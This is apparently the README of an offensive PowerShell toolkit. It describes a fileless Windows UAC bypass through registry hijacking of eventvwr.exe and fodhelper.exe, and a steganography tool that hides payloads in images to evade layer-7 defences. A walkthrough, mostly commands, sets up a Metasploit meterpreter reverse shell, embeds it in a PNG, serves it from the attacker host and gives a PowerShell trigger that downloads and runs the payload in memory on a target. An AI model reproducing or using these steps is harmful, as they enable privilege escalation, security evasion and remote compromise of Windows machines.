# Offensive-PowerShell
Collection of powershell scripts to be used during an offensive operation.   

## Set-FilelessBypassUac
Bypass the Windows User Account Control (UAC) with fileless methods.

Based on “Fileless” UAC Bypass Using eventvwr.exe and Registry Hijacking technique from Matt Nelson (@enigma0x3).
https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/

### METHODS:

* mscfile - Matt Nelson (@enigma0x3) method using CompMgmtLauncher.exe to replace eventvwr.exe.

    Working on:
    *  Microsoft Windows 7;
    *  Microsoft Windows 8;
    *  Microsoft Windows 8.1;
    *  Microsoft Windows 10 (UNTIL the build 15025.rs2)
    *  Microsoft Windows 2008;
    *  Microsoft Windows 2008 R2;
    *  Microsoft Windows 2016.

* ms-settings - NEW method using ms-settings registry key with DelegateExecute and fodhelper.exe.

    Working on:
    *  Microsoft Windows 10 (tested with successful until the build 15031.rs2)
    *  Microsoft Windows 2016.

## Set-PowerStego
Set-PowerStego allows text or binary files (including payloads developed in powershell and/or PE files) to be inserted into a selected image (BMP or PNG) using the Least Significant Bits (LSB) technique.
It will also be possible to recover the inserted file and in some cases execute it directly in the memory.(Does not touch the disk).

With Set-PowerStego you can bypass Layer 7 security solutions.

###Steps
    1 - Hide a PAYLOAD inside of a image (with a good resolution).
    2 - Store the image on a Webserver that target have access.
    3 - Run the trigger (powershell command line) on the target.
      * The target will download the image to the memory.
      * The payload will be extract on the memory.
      * Powershell payloads will be executed on the memory and PE payloads will be copied to the disk and executed.
    4 - Receive your shell.

### CASE STUDY - Hiding a meterpreter payload inside of image.  
    1 - Open the msfconsole.
    msfconsole

    2 - Select and configure the web_delivery exploit.
    use exploit/multi/script/web_delivery  
    set windows/meterpreter/reverse_https
    set target 2
    set srvport 80
    set uripath /report
    set LHOST <IPADDRESS>
    set LPORT 443
    exploit

    3 - From your Windows machine download the powershell script from web_delivery.
    iwr http://IPFROMMETASPLOITHOST/report -OutFile report.txt

    4 - Open the powershell and import the Set-Powerstego.ps1.
    Import-Module Set-Powerstego.ps1

    5 - Select and analize the properties from a image (BMP or PNG) with a good resolution.
    Set-PowerStego -Method Analyze -ImageSource File -ImageSourcePath <image.png>

    6 - Hide de payload inside the image.
    Set-PowerStego -Method Hide -ImageSource File -ImageSourcePath myimage.png -ImageDestinationPath myimagewithpayload.png -PayloadSource Text -PayloadPath script.ps1

    7 - Copy the image to the METASPLOIT host and start a webserver to be possible access the image.
    cd imagefolder
    pythom -m SimpleHTTPServer 8080

    8 - From the Windows workstation extract the payload to the disk.
    Set-PowerStego -Method UnHide -ImageSource URL -ImageSourcePath http://<IPFROMMETASPLOITHOST:8080>/myimage.png -PayloadSource Text -PayloadPath report2

    Open the file report2 and compare with the file report.  

    9 - Generate a command line to execute the payload on the target.
    Set-PowerStego -Method GeneratePayload -ImageSource URL -ImageSourcePath http://<IPFROMMETASPLOITHOST:8080>/myimage.png -PayloadSource Text -PayloadPath myscript.txt

    Execute the content from the file myscript.txt on any Windows workstion with powershell and access to the metasploit host.
    After the execution, it will be download the image to the memory from the target, the payload extration and execution on the memory, and you will receive a meterpreter shell on the Metasploit host.